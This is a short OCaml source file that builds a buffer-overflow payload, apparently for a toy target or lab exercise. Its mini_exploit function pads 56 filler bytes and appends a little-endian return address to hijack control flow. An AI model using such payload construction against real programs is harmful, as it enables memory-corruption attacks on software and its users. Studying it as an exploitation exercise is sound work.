open Octosyn
open Utils

let mini_exploit buff_size call =
  let nop   = hex "aa" in
  let adr   = List.rev (parse_bytes call) in
  let adrl  = List.length adr in
  let buff  = Array.make (buff_size + adrl) nop in
  List.iteri (fun i x -> buff.(buff_size + i) <- x) adr;
  buff

let _ = mini_exploit 56 "00 42 1d 6a"

